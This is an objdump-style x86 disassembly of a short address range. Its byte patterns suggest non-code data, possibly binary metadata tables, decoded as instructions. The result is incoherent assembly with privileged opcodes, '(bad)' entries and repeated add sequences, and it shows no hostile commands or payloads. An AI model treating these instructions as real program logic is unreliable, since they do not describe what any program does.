  406f6f:	05 81 02 a2 06       	add    $0x6a20281,%eax
  406f74:	0d 05 a9 02 eb       	or     $0xeb02a905,%eax
  406f79:	06                   	push   %es
  406f7a:	47                   	inc    %edi
  406f7b:	02 b1 02 56 07 47    	add    0x47075602(%ecx),%dh
  406f81:	02 c1                	add    %cl,%al
  406f83:	01 73 1d             	add    %esi,0x1d(%ebx)
  406f86:	16                   	push   %ss
  406f87:	04 81                	add    $0x81,%al
  406f89:	02 dd                	add    %ch,%bl
  406f8b:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f90:	2f                   	das
  406f91:	0f 0e                	femms
  406f93:	00 89 02 f9 14 0e    	add    %cl,0xe14f902(%ecx)
  406f99:	00 89 02 f8 06 6b    	add    %cl,0x6b06f802(%ecx)
  406f9f:	01 b1 02 e2 06 47    	add    %esi,0x4706e202(%ecx)
  406fa5:	02 a1 02 dc 10 c7    	add    -0x38ef23fe(%ecx),%ah
  406fab:	00 c1                	add    %al,%cl
  406fad:	01 b5 18 1a 05 89    	add    %esi,-0x76fae5e8(%ebp)
  406fb3:	02 7d 18             	add    0x18(%ebp),%bh
  406fb6:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb9:	02 bf 06 20 05 89    	add    -0x76fadffa(%edi),%bh
  406fbf:	02 10                	add    (%eax),%dl
  406fc1:	1c 4b                	sbb    $0x4b,%al
  406fc3:	02 81 02 8b 1b 27    	add    0x271b8b02(%ecx),%al
  406fc9:	05 c1 02 56 14       	add    $0x145602c1,%eax
  406fce:	30 05 c9 02 72 08    	xor    %al,0x87202c9
  406fd4:	c7 00 91 02 b7 1c    	movl   $0x1cb70291,(%eax)
  406fda:	35 05 c1 01 b5       	xor    $0xb501c105,%eax
  406fdf:	18 3f                	sbb    %bh,(%edi)
  406fe1:	05 91 02 b8 0a       	add    $0xab80291,%eax
  406fe6:	46                   	inc    %esi
  406fe7:	05 d9 02 9e 18       	add    $0x189e02d9,%eax
  406fec:	84 00                	test   %al,(%eax)
  406fee:	d9 02                	flds   (%edx)
  406ff0:	d2 08                	rorb   %cl,(%eax)
  406ff2:	3e 01 e1             	ds add %esp,%ecx
  406ff5:	02 f9                	add    %cl,%bh
  406ff7:	14 4c                	adc    $0x4c,%al
  406ff9:	05 d9 02 60 16       	add    $0x166002d9,%eax
  406ffe:	2a 01                	sub    (%ecx),%al
  407000:	a1 02 05 07 c3       	mov    0xc3070502,%eax
  407005:	00 c1                	add    %al,%cl
  407007:	01 b5 18 01 05 99    	add    %esi,-0x66fafee8(%ebp)
  40700d:	02 f9                	add    %cl,%bh
  40700f:	14 6b                	adc    $0x6b,%al
  407011:	01 f1                	add    %esi,%ecx
  407013:	02 d2                	add    %dl,%dl
  407015:	07                   	pop    %es
  407016:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407019:	02 53 0d             	add    0xd(%ebx),%dl
  40701c:	c3                   	ret
  40701d:	00 a1 02 15 07 c7    	add    %ah,-0x38f8eafe(%ecx)
  407023:	00 89 02 fd 0c 4b    	add    %cl,0x4b0cfd02(%ecx)
  407029:	02 89 02 71 0a 4b    	add    0x4b0a7102(%ecx),%cl
  40702f:	02 59 01             	add    0x1(%ecx),%bl
  407032:	99                   	cltd
  407033:	1b 3e                	sbb    (%esi),%edi
  407035:	01 59 01             	add    %ebx,0x1(%ecx)
  407038:	47                   	inc    %edi
  407039:	1d c3 00 a1 02       	sbb    $0x2a100c3,%eax
  40703e:	5c                   	pop    %esp
  40703f:	1b c7                	sbb    %edi,%eax
  407041:	00 f9                	add    %bh,%cl
  407043:	02 f9                	add    %cl,%bh
  407045:	14 6b                	adc    $0x6b,%al
  407047:	01 f9                	add    %edi,%ecx
  407049:	02 00                	add    (%eax),%al
  40704b:	0b 23                	or     (%ebx),%esp
  40704d:	02 01                	add    (%ecx),%al
  40704f:	03 f9                	add    %ecx,%edi
  407051:	14 0e                	adc    $0xe,%al
  407053:	00 01                	add    %al,(%ecx)
  407055:	03 47 07             	add    0x7(%edi),%eax
  407058:	47                   	inc    %edi
  407059:	02 c1                	add    %cl,%al
  40705b:	01 8d 14 47 02 c1    	add    %ecx,-0x3efdb8ec(%ebp)
  407061:	01 b7 17 42 02 09    	add    %esi,0x9024217(%edi)
  407067:	03 f9                	add    %ecx,%edi
  407069:	14 6b                	adc    $0x6b,%al
  40706b:	01 09                	add    %ecx,(%ecx)
  40706d:	03 52 19             	add    0x19(%edx),%edx
  407070:	6a 05                	push   $0x5
  407072:	11 03                	adc    %eax,(%ebx)
  407074:	e1 14                	loope  0x40708a
  407076:	70 05                	jo     0x40707d
  407078:	19 03                	sbb    %eax,(%ebx)
  40707a:	e2 1a                	loop   0x407096
  40707c:	76 05                	jbe    0x407083
  40707e:	21 03                	and    %eax,(%ebx)
  407080:	c9                   	leave
  407081:	0f 7c                	(bad)
  407083:	05 c1 01 fe 19       	add    $0x19fe01c1,%eax
  407088:	47                   	inc    %edi
  407089:	02 19                	add    (%ecx),%bl
  40708b:	03 ce                	add    %esi,%ecx
  40708d:	1b bf 01 81 02 c8    	sbb    -0x37fd7eff(%edi),%edi
  407093:	05 86 05 29 03       	add    $0x3290586,%eax
  407098:	6e                   	outsb  %ds:(%esi),(%dx)
  407099:	00 f4                	add    %dh,%ah
  40709b:	01 59 01             	add    %ebx,0x1(%ecx)
  40709e:	43                   	inc    %ebx
  40709f:	1b 7b 00             	sbb    0x0(%ebx),%edi
  4070a2:	59                   	pop    %ecx
  4070a3:	01 75 07             	add    %esi,0x7(%ebp)
  4070a6:	c3                   	ret
  4070a7:	00 59 01             	add    %bl,0x1(%ecx)
  4070aa:	37                   	aaa
  4070ab:	07                   	pop    %es
  4070ac:	c3                   	ret
  4070ad:	00 59 01             	add    %bl,0x1(%ecx)
  4070b0:	f8                   	clc
  4070b1:	10 93 05 c1 01 b5    	adc    %dl,-0x4afe3efb(%ebx)
  4070b7:	18 99 05 49 03 f9    	sbb    %bl,-0x6fcb6fb(%ecx)
  4070bd:	14 0e                	adc    $0xe,%al
  4070bf:	00 61 01             	add    %ah,0x1(%ecx)
  4070c2:	52                   	push   %edx
  4070c3:	02 cd                	add    %ch,%cl
  4070c5:	03 51 03             	add    0x3(%ecx),%edx
  4070c8:	11 0d 75 01 69 00    	adc    %ecx,0x690175
  4070ce:	f9                   	stc
  4070cf:	14 0e                	adc    $0xe,%al
  4070d1:	00 21                	add    %ah,(%ecx)
  4070d3:	02 5e 0c             	add    0xc(%esi),%bl
  4070d6:	70 01                	jo     0x4070d9
  4070d8:	69 00 c9 04 aa 05    	imul   $0x5aa04c9,(%eax),%eax
  4070de:	c1 01 c2             	roll   $0xc2,(%ecx)
  4070e1:	0c b0                	or     $0xb0,%al
  4070e3:	05 c1 01 3b 14       	add    $0x143b01c1,%eax
  4070e8:	47                   	inc    %edi
  4070e9:	02 c1                	add    %cl,%al
  4070eb:	01 e2                	add    %esp,%edx
  4070ed:	04 bd                	add    $0xbd,%al
  4070ef:	05 59 01 d2 0f       	add    $0xfd20159,%eax
  4070f4:	1d 00 61 03 5e       	sbb    $0x5e036100,%eax
  4070f9:	0c 47                	or     $0x47,%al
  4070fb:	02 69 03             	add    0x3(%ecx),%ch
  4070fe:	40                   	inc    %eax
  4070ff:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  407104:	b0 07                	mov    $0x7,%al
  407106:	c3                   	ret
  407107:	05 59 03 c2 07       	add    $0x7c20359,%eax
  40710c:	c3                   	ret
  40710d:	05 59 03 5e 0c       	add    $0xc5e0359,%eax
  407112:	47                   	inc    %edi
  407113:	02 71 03             	add    0x3(%ecx),%dh
  407116:	ee                   	out    %al,(%dx)
  407117:	1a c9                	sbb    %cl,%cl
  407119:	05 79 03 f9 14       	add    $0x14f90379,%eax
  40711e:	cf                   	iret
  40711f:	05 79 03 71 06       	add    $0x6710379,%eax
  407124:	d6                   	salc
  407125:	05 c1 00 5e 08       	add    $0x85e00c1,%eax
  40712a:	0e                   	push   %cs
  40712b:	00 19                	add    %bl,(%ecx)
  40712d:	00 5e 08             	add    %bl,0x8(%esi)
  407130:	0e                   	push   %cs
  407131:	00 09                	add    %cl,(%ecx)
  407133:	03 f9                	add    %ecx,%edi
  407135:	14 36                	adc    $0x36,%al
  407137:	02 0c 00             	add    (%eax,%eax,1),%cl
  40713a:	f9                   	stc
  40713b:	14 0e                	adc    $0xe,%al
  40713d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407140:	22 03                	and    (%ebx),%al
  407142:	f5                   	cmc
  407143:	05 0c 00 39 1b       	add    $0x1b39000c,%eax
  407148:	f4                   	hlt
  407149:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  40714c:	6e                   	outsb  %ds:(%esi),(%dx)
  40714d:	1c fb                	sbb    $0xfb,%al
  40714f:	05 c1 01 d7 10       	add    $0x10d701c1,%eax
  407154:	01 06                	add    %eax,(%esi)
  407156:	51                   	push   %ecx
  407157:	00 e6                	add    %ah,%dh
  407159:	17                   	pop    %ss
  40715a:	11 06                	adc    %eax,(%esi)
  40715c:	51                   	push   %ecx
  40715d:	00 f4                	add    %dh,%ah
  40715f:	01 17                	add    %edx,(%edi)
  407161:	06                   	push   %es
  407162:	59                   	pop    %ecx
  407163:	00 6b 03             	add    %ch,0x3(%ebx)
  407166:	17                   	pop    %ss
  407167:	06                   	push   %es
  407168:	89 03                	mov    %eax,(%ebx)
  40716a:	67 1d 1d 06 69 00    	addr16 sbb $0x69061d,%eax
  407170:	f9                   	stc
  407171:	14 01                	adc    $0x1,%al
  407173:	03 61 00             	add    0x0(%ecx),%esp
  407176:	f9                   	stc
  407177:	14 2d                	adc    $0x2d,%al
  407179:	06                   	push   %es
  40717a:	91                   	xchg   %eax,%ecx
  40717b:	03 5e 08             	add    0x8(%esi),%ebx
  40717e:	0e                   	push   %cs
  40717f:	00 99 03 f9 14 56    	add    %bl,0x5614f903(%ecx)
  407185:	04 a1                	add    $0xa1,%al
  407187:	03 ad 0b 35 06 81    	add    -0x7ef9caf5(%ebp),%ebp
  40718d:	02 17                	add    (%edi),%dl
  40718f:	05 0a 00 91 02       	add    $0x291000a,%eax
  407194:	9d                   	popf
  407195:	1c 35                	sbb    $0x35,%al
  407197:	05 91 02 b8 0a       	add    $0xab80291,%eax
  40719c:	43                   	inc    %ebx
  40719d:	06                   	push   %es
  40719e:	89 01                	mov    %eax,(%ecx)
  4071a0:	79 05                	jns    0x4071a7
  4071a2:	47                   	inc    %edi
  4071a3:	02 91 02 9d 1c 54    	add    0x541c9d02(%ecx),%dl
  4071a9:	06                   	push   %es
  4071aa:	91                   	xchg   %eax,%ecx
  4071ab:	02 af 0a 7c 05 91    	add    -0x6efa83f6(%edi),%ch
  4071b1:	02 98 0a 6b 01 91    	add    -0x6efe94f6(%eax),%bl
  4071b7:	02 b7 1c 5e 06 91    	add    -0x6ef9a1e4(%edi),%dh
  4071bd:	02 68 05             	add    0x5(%eax),%ch
  4071c0:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071c3:	00 22                	add    %ah,(%edx)
  4071c5:	03 f5                	add    %ebp,%esi
  4071c7:	05 b9 03 a2 1b       	add    $0x1ba203b9,%eax
  4071cc:	7c 06                	jl     0x4071d4
  4071ce:	1c 00                	sbb    $0x0,%al
  4071d0:	e1 14                	loope  0x4071e6
  4071d2:	92                   	xchg   %eax,%edx
  4071d3:	06                   	push   %es
  4071d4:	24 00                	and    $0x0,%al
  4071d6:	e2 1a                	loop   0x4071f2
  4071d8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071d9:	06                   	push   %es
  4071da:	1c 00                	sbb    $0x0,%al
  4071dc:	e3 0a                	jecxz  0x4071e8
  4071de:	a9 06 24 00 ce       	test   $0xce002406,%eax
  4071e3:	1b bf 01 c9 03 b4    	sbb    -0x4bfc36ff(%edi),%edi
  4071e9:	10 b3 06 c9 03 18    	adc    %dh,0x1803c906(%ebx)
  4071ef:	03 b9 06 d1 03 25    	add    0x2503d106(%ecx),%edi
  4071f5:	08 c1                	or     %al,%cl
  4071f7:	06                   	push   %es
  4071f8:	e1 03                	loope  0x4071fd
  4071fa:	ea 04 c8 06 d9 03 08 	ljmp   $0x803,$0xd906c804
  407201:	06                   	push   %es
  407202:	cf                   	iret
  407203:	06                   	push   %es
  407204:	f1                   	int1
  407205:	03 b3 08 d8 06 01    	add    0x106d808(%ebx),%esi
  40720b:	04 c9                	add    $0xc9,%al
  40720d:	12 e2                	adc    %dl,%ah
  40720f:	06                   	push   %es
  407210:	2c 00                	sub    $0x0,%al
  407212:	b3 08                	mov    $0x8,%bl
  407214:	17                   	pop    %ss
  407215:	07                   	pop    %es
  407216:	2c 00                	sub    $0x0,%al
  407218:	65 19 23             	sbb    %esp,%gs:(%ebx)
  40721b:	07                   	pop    %es
  40721c:	34 00                	xor    $0x0,%al
  40721e:	95                   	xchg   %eax,%ebp
  40721f:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  407224:	f9                   	stc
  407225:	14 0e                	adc    $0xe,%al
  407227:	00 c1                	add    %al,%cl
  407229:	01 a5 1d 84 00 21    	add    %esp,0x2100841d(%ebp)
  40722f:	04 f9                	add    $0xf9,%al
  407231:	14 6b                	adc    $0x6b,%al
  407233:	01 19                	add    %ebx,(%ecx)
  407235:	04 f9                	add    $0xf9,%al
  407237:	14 59                	adc    $0x59,%al
  407239:	07                   	pop    %es
  40723a:	29 04 ad 16 61 07 51 	sub    %eax,0x51076116(,%ebp,4)
  407241:	01 29                	add    %ebp,(%ecx)
  407243:	0c 93                	or     $0x93,%al
  407245:	01 49 04             	add    %ecx,0x4(%ecx)
  407248:	f9                   	stc
  407249:	14 6b                	adc    $0x6b,%al
  40724b:	01 59 02             	add    %ebx,0x2(%ecx)
  40724e:	f9                   	stc
  40724f:	14 0e                	adc    $0xe,%al
  407251:	00 31                	add    %dh,(%ecx)
  407253:	04 f9                	add    $0xf9,%al
  407255:	14 0e                	adc    $0xe,%al
  407257:	00 51 04             	add    %dl,0x4(%ecx)
  40725a:	55                   	push   %ebp
  40725b:	0b 01                	or     (%ecx),%eax
  40725d:	03 51 04             	add    0x4(%ecx),%edx
  407260:	f2 0a 01             	repnz or (%ecx),%al
  407263:	03 51 04             	add    0x4(%ecx),%edx
  407266:	f9                   	stc
  407267:	04 7a                	add    $0x7a,%al
  407269:	07                   	pop    %es
  40726a:	51                   	push   %ecx
  40726b:	04 a1                	add    $0xa1,%al
  40726d:	0b 81 07 51 04 95    	or     -0x6afbaef9(%ecx),%eax
  407273:	1c 2b                	sbb    $0x2b,%al
  407275:	02 51 04             	add    0x4(%ecx),%dl
  407278:	8c 02                	mov    %es,(%edx)
  40727a:	0e                   	push   %cs
  40727b:	00 51 04             	add    %dl,0x4(%ecx)
  40727e:	1e                   	push   %ds
  40727f:	15 88 07 39 04       	adc    $0x4390788,%eax
  407284:	f9                   	stc
  407285:	14 8e                	adc    $0x8e,%al
  407287:	07                   	pop    %es
  407288:	51                   	push   %ecx
  407289:	04 7e                	add    $0x7e,%al
  40728b:	02 31                	add    (%ecx),%dh
  40728d:	02 39                	add    (%ecx),%bh
  40728f:	04 44                	add    $0x44,%al
  407291:	0e                   	push   %cs
  407292:	0e                   	push   %cs
  407293:	00 41 04             	add    %al,0x4(%ecx)
  407296:	f9                   	stc
  407297:	14 2b                	adc    $0x2b,%al
  407299:	02 59 02             	add    0x2(%ecx),%bl
  40729c:	6e                   	outsb  %ds:(%esi),(%dx)
  40729d:	1c 31                	sbb    $0x31,%al
  40729f:	02 51 03             	add    0x3(%ecx),%dl
  4072a2:	11 0d 9a 07 79 04    	adc    %ecx,0x479079a
  4072a8:	f9                   	stc
  4072a9:	14 6b                	adc    $0x6b,%al
  4072ab:	01 51 04             	add    %edx,0x4(%ecx)
  4072ae:	85 02                	test   %eax,(%edx)
  4072b0:	2b 02                	sub    (%edx),%eax
  4072b2:	51                   	push   %ecx
  4072b3:	04 0e                	add    $0xe,%al
  4072b5:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072ba:	75 0d                	jne    0x4072c9
  4072bc:	23 02                	and    (%edx),%eax
  4072be:	81 04 28 1d be 07 91 	addl   $0x9107be1d,(%eax,%ebp,1)
  4072c5:	04 51                	add    $0x51,%al
  4072c7:	1c d0                	sbb    $0xd0,%al
  4072c9:	07                   	pop    %es
  4072ca:	a1 04 f9 14 0e       	mov    0xe14f904,%eax
  4072cf:	00 c1                	add    %al,%cl
  4072d1:	01 c1                	add    %eax,%ecx
  4072d3:	18 f9                	sbb    %bh,%cl
  4072d5:	07                   	pop    %es
  4072d6:	49                   	dec    %ecx
  4072d7:	02 ad 16 99 01 49    	add    0x49019916(%ebp),%ch
  4072dd:	02 ad 16 ab 01 a9    	add    -0x56fe54ea(%ebp),%ch
  4072e3:	00 f9                	add    %bh,%cl
  4072e5:	14 0e                	adc    $0xe,%al
  4072e7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072ea:	c9                   	leave
  4072eb:	0f 06                	clts
  4072ed:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072f0:	39 1b                	cmp    %ebx,(%ebx)
  4072f2:	f4                   	hlt
  4072f3:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072f6:	be 12 0e 00 c1       	mov    $0xc1000e12,%esi
  4072fb:	01 6a 17             	add    %ebp,0x17(%edx)
  4072fe:	42                   	inc    %edx
  4072ff:	02 c1                	add    %cl,%al
  407301:	00 8e 0a 28 08 49    	add    %cl,0x4908280a(%esi)
  407307:	02 ad 16 a5 01 51    	add    0x5101a516(%ebp),%ch
  40730d:	01 ad 00 32 08 c1    	add    %ebp,-0x3ef7ce00(%ebp)
  407313:	01 33                	add    %esi,(%ebx)
  407315:	10 47 02             	adc    %al,0x2(%edi)
  407318:	a9 04 6c 08 37       	test   $0x37086c04,%eax
  40731d:	08 51 01             	or     %dl,0x1(%ecx)
  407320:	ad                   	lods   %ds:(%esi),%eax
  407321:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  407324:	51                   	push   %ecx
  407325:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  40732b:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407331:	01 ce                	add    %ecx,%esi
  407333:	00 4d 08             	add    %cl,0x8(%ebp)
  407336:	41                   	inc    %ecx
  407337:	03 6c 08 52          	add    0x52(%eax,%ecx,1),%ebp
  40733b:	08 51 01             	or     %dl,0x1(%ecx)
  40733e:	ce                   	into
  40733f:	00 57 08             	add    %dl,0x8(%edi)
  407342:	51                   	push   %ecx
  407343:	01 ce                	add    %ecx,%esi
  407345:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407349:	01 ce                	add    %ecx,%esi
  40734b:	00 61 08             	add    %ah,0x8(%ecx)
  40734e:	51                   	push   %ecx
  40734f:	01 b4 05 68 08 b1 04 	add    %esi,0x4b10868(%ebp,%eax,1)
  407356:	6c                   	insb   (%dx),%es:(%edi)
  407357:	08 6d 08             	or     %ch,0x8(%ebp)
  40735a:	49                   	dec    %ecx
  40735b:	02 ad 16 7a 08 59    	add    0x59087a16(%ebp),%ch
  407361:	03 3e                	add    (%esi),%edi
  407363:	1d 23 02 e1 02       	sbb    $0x2e10223,%eax
  407368:	f9                   	stc
  407369:	14 88                	adc    $0x88,%al
  40736b:	08 c1                	or     %al,%cl
  40736d:	00 85 0a f4 01 89    	add    %al,-0x76fe0bf6(%ebp)
  407373:	01 f9                	add    %edi,%ecx
  407375:	14 6b                	adc    $0x6b,%al
  407377:	01 49 02             	add    %ecx,0x2(%ecx)
  40737a:	e0 00                	loopne 0x40737c
  40737c:	b6 08                	mov    $0x8,%dh
  40737e:	49                   	dec    %ecx
  40737f:	02 31                	add    (%ecx),%dh
  407381:	06                   	push   %es
  407382:	bd 08 49 02 b4       	mov    $0xb4024908,%ebp
  407387:	05 c4 08 49 02       	add    $0x24908c4,%eax
  40738c:	65 00 cb             	gs add %cl,%bl
  40738f:	08 49 02             	or     %cl,0x2(%ecx)
  407392:	ad                   	lods   %ds:(%esi),%eax
  407393:	00 d2                	add    %dl,%dl
  407395:	08 49 02             	or     %cl,0x2(%ecx)
  407398:	e9 00 d9 08 49       	jmp    0x49494c9d
  40739d:	02 ce                	add    %dh,%cl
  40739f:	00 e0                	add    %ah,%al
  4073a1:	08 49 02             	or     %cl,0x2(%ecx)
  4073a4:	ad                   	lods   %ds:(%esi),%eax
  4073a5:	16                   	push   %ss
  4073a6:	12 09                	adc    (%ecx),%cl
  4073a8:	d1 04 f9             	roll   $1,(%ecx,%edi,8)
  4073ab:	14 28                	adc    $0x28,%al
  4073ad:	09 09                	or     %ecx,(%ecx)
  4073af:	00 80 00 0d 01 09    	add    %al,0x9010d00(%eax)
  4073b5:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073bc:	88 00                	mov    %al,(%eax)
  4073be:	17                   	pop    %ss
  4073bf:	01 08                	add    %ecx,(%eax)
  4073c1:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073c7:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073ce:	a0 00 66 01 08       	mov    0x8016600,%al
  4073d3:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073da:	ec                   	in     (%dx),%al
  4073db:	00 7f 02             	add    %bh,0x2(%edi)
  4073de:	08 00                	or     %al,(%eax)
  4073e0:	f0 00 17             	lock add %dl,(%edi)
  4073e3:	01 08                	add    %ecx,(%eax)
  4073e5:	00 f4                	add    %dh,%ah
  4073e7:	00 12                	add    %dl,(%edx)
  4073e9:	01 08                	add    %ecx,(%eax)
  4073eb:	00 f8                	add    %bh,%al
  4073ed:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073f4:	89 02                	mov    %eax,(%edx)
  4073f6:	08 00                	or     %al,(%eax)
  4073f8:	00 01                	add    %al,(%ecx)
  4073fa:	8e 02                	mov    (%edx),%es
  4073fc:	08 00                	or     %al,(%eax)
  4073fe:	04 01                	add    $0x1,%al
  407400:	93                   	xchg   %eax,%ebx
  407401:	02 08                	add    (%eax),%cl
  407403:	00 08                	add    %cl,(%eax)
  407405:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  40740b:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407411:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  407417:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  40741d:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  407424:	06                   	push   %es
  407425:	03 2e                	add    (%esi),%ebp
  407427:	00 33                	add    %dh,(%ebx)
  407429:	00 0f                	add    %cl,(%edi)
  40742b:	03 2e                	add    (%esi),%ebp
  40742d:	00 3b                	add    %bh,(%ebx)
  40742f:	00 34 03             	add    %dh,(%ebx,%eax,1)
  407432:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  407436:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  40743b:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407441:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  407447:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  40744d:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  407453:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407459:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  40745f:	00 43 03             	add    %al,0x3(%ebx)
  407462:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407469:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  40746f:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  407475:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  40747b:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407481:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  407487:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  40748d:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  407493:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407499:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  40749f:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  4074a5:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074ab:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074b1:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074b7:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074bd:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074c3:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c9:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074cf:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074d5:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074db:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074e1:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074e7:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074ed:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074f3:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f9:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074ff:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  407505:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  40750b:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407511:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  407517:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  40751d:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  407523:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407529:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  40752f:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  407535:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  40753b:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407541:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407547:	00 20                	add    %ah,(%eax)
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40754e:	01 00                	add    %eax,(%eax)
  407550:	06                   	push   %es
  407551:	00 00                	add    %al,(%eax)
  407553:	00 1e                	add    %bl,(%esi)
  407555:	00 c0                	add    %al,%al
  407557:	03 c9                	add    %ecx,%ecx
  407559:	03 f4                	add    %esp,%esi
  40755b:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  407562:	54                   	push   %esp
  407563:	05 59 05 81 05       	add    $0x5810559,%eax
  407568:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  40756e:	b6 05                	mov    $0x5,%dh
  407570:	dd 05 08 06 27 06    	fldl   0x6270608
  407576:	3c 06                	cmp    $0x6,%al
  407578:	4c                   	dec    %esp
  407579:	06                   	push   %es
  40757a:	66 06                	pushw  %es
  40757c:	af                   	scas   %es:(%edi),%eax
  40757d:	06                   	push   %es
  40757e:	53                   	push   %ebx
  40757f:	07                   	pop    %es
  407580:	67 07                	addr16 pop %es
  407582:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  407587:	07                   	pop    %es
  407588:	e8 07 f0 07 ff       	call   0xff486594
  40758d:	07                   	pop    %es
  40758e:	0c 08                	or     $0x8,%al
  407590:	11 08                	adc    %ecx,(%eax)
  407592:	20 08                	and    %cl,(%eax)
  407594:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407599:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  40759f:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  4075a5:	08 f7                	or     %dh,%bh
  4075a7:	08 fc                	or     %bh,%ah
  4075a9:	08 02                	or     %al,(%edx)
  4075ab:	09 0b                	or     %ecx,(%ebx)
  4075ad:	09 18                	or     %ebx,(%eax)
  4075af:	09 31                	or     %esi,(%ecx)
  4075b1:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075b4:	01 00                	add    %eax,(%eax)
  4075b6:	16                   	push   %ss
  4075b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075ba:	17                   	pop    %ss
  4075bb:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075c1:	00 00                	add    %al,(%eax)
  4075c3:	00 58 1a             	add    %bl,0x1a(%eax)
  4075c6:	9f                   	lahf
  4075c7:	00 00                	add    %al,(%eax)
  4075c9:	00 3c 1a             	add    %bh,(%edx,%ebx,1)
  4075cc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4075cd:	00 00                	add    %al,(%eax)
  4075cf:	00 95 13 a9 00 00    	add    %dl,0xa913(%ebp)
  4075d5:	00 21                	add    %ah,(%ecx)
  4075d7:	0b ae 00 00 00 d2    	or     -0x2e000000(%esi),%ebp
  4075dd:	19 ae 00 00 00 d9    	sbb    %ebp,-0x27000000(%esi)
  4075e3:	0a b2 00 00 00 56    	or     0x56000000(%edx),%dh
  4075e9:	03 b7 00 00 00 f6    	add    -0xa000000(%edi),%esi
  4075ef:	02 bb 00 00 00 8b    	add    -0x75000000(%ebx),%bh
  4075f5:	0b b2 00 00 00 f5    	or     -0xb000000(%edx),%esi
  4075fb:	0e                   	push   %cs
